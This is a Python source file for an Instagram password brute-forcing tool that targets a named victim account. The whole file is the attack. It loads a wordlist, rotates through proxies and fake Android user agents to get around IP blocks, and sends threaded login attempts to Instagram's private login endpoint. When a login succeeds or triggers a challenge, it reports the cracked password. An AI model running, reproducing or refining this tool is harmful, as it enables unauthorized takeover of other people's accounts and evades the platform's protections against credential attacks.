from datetime import datetime
from time import (sleep,time)
from .proxychecker import ProxyChecker
from .console import (Console,runnerBruteBanner)
from threading import (Thread,Lock)
from queue import Queue
from random import (choice,randint)
import requests
import sys
import json
import uuid
import os

class Bruter:
    def __init__(self,wordlist:str,proxy_type:str,victim:str,max_thread:int) -> None:
        self.__max_thread = max_thread
        self.__wordlist = wordlist
        self.__proxy_type = proxy_type
        self.__victim = victim
        self.__getproxy = []
        self.__ip = ""
        self.__passw = ""
        self.__isAlive = True
        self.__prxs = ["http","socks4","socks5"]
        os.system("cls")

        if self.__proxy_type in self.__prxs:
            print(f"{Console.ORANGE}[{self.__proxy_type}]  ─────  Proxy Checked is Starting")
            self.__getproxy = ProxyChecker(self.__proxy_type).getWorkerProxy
    
        elif not self.__proxy_type in self.__prxs:
            self.__getproxy = ProxyChecker(isProxyPath=True,filePath=self.__proxy_type).getWorkerProxy

        if self.__getproxy == []:
            print("No Working Proxy Found!")

        else:
            os.system("cls")
            print(Console.BANNER_BRUTE+"\n")
            self.__attackStart()

    def __csrfToken(self):
        with requests.Session() as session:
            return session.get("https://www.instagram.com/",headers={"user-agent":self.__useragents()}).cookies.get_dict()["csrftoken"]

    def __login(self,q:Queue):
        if not q.empty():
            try:
                with requests.Session() as session:
                    password = q.get()
                    choice_proxy = choice(self.__getproxy)
                    # print(runnerBruteBanner(passw=password,ip=choice_proxy,
                    #                     words=len(list(self.__readerwordlist())),
                    #                     prxies=len(self.__getproxy),target=self.__victim))
                    # sleep(1)
                    # os.system("cls")
                    __header = {
                        'Host':'i.instagram.com','Accept':'*/*',  'User-Agent': self.__useragents(),
                        'Cookie':'missing','Accept-Encoding':'gzip, deflate',
                        'Accept-Language':'en-US','X-IG-Capabilities':'3brTvw==',
                        'X-IG-Connection-Type':'WIFI','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                        }
                    __data = {
                            "uuid": uuid.uuid4(),"password": password,
                            "username": self.__victim,'device_id':uuid.uuid4(),
                            'from_reg':'false','_csrftoken':self.__csrfToken(),
                            'login_attempt_countn':'0'
                        }
                    __proxies = {}
                    if not self.__proxy_type in self.__prxs:
                        __proxies = {
                            "http":f"http://{choice_proxy}",
                            "https":f"http://{choice_proxy}"
                        }
                    else:
                        __proxies = {
                            "http":f"{self.__proxy_type}://{choice_proxy}",
                            "https":f"{self.__proxy_type}://{choice_proxy}"
                        }
                    s = session.post("https://i.instagram.com/api/v1/accounts/login/",
                                        data=__data,headers=__header,
                                        proxies=__proxies,timeout=randint(5,50))

                    json_load = json.loads(s.text)
                    for k,v in json_load.items():
                        if k == "logged_in_user":
                            self.__isAlive = False
                            self.__passw = password
                            q.queue.clear()
                            q.task_done()

                        elif k == "error_type":
                            if v == "ip_block" or v == "bad_password":
                                print(f"{Console.BLUE}Blocked IP: {choice_proxy}{Console.DEFAULT}")

                        elif k == "message":
                            if v == "challenge_required":
                                self.__isAlive = False
                                self.__passw = password
                                q.queue.clear()
                                q.task_done()

            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError,
                    requests.exceptions.ProxyError,
                    requests.exceptions.ReadTimeout,KeyError):
                q.task_done()

    def __readerwordlist(self):
        try:
            with open(file=self.__wordlist,mode="r",encoding="utf-8") as f:
                for i in f:
                    yield i.replace("\n","")
        except FileNotFoundError:
            print("File Not Found!")
    
    def __useragents(self):
        dpi_phone = ['133','320','515','160','640','240','120''800','480','225','768','216','1024']
        model_phone = ['Nokia 2.4','HUAWEI','Galaxy','Unlocked Smartphones','Nexus 6P','Mobile Phones','Xiaomi','samsung','OnePlus']
        pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
        i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
        user_agent = f'Instagram {choice(i_version)} Android (30/3.0; {choice(dpi_phone)}dpi; {choice(pxl_phone)}; huawei/google; {choice(model_phone)}; angler; angler; en_US)'
        return user_agent
    
    def __attackStart(self):
        __queue = Queue()
        __threads = []
        __queuelock = Lock()
        try:
            for passw in self.__readerwordlist():
                __queue.put(passw)
                
            while not __queue.empty():
                __queuelock.acquire()
                for _ in range(self.__max_thread):
                    t1 = Thread(target=self.__login,daemon=True,args=(__queue,))
                    t1.start()
                    __threads.append(t1)
                
                for worker in __threads:
                    worker.join()
                
                __queuelock.release()
                if not self.__isAlive:
                    break

            print("Brute Force Attack is completed")
            if self.__isAlive:
                print("Password not found.")
            else:
                print("Password is Found! %s" % self.__passw)

        except Exception as e:
            print(e)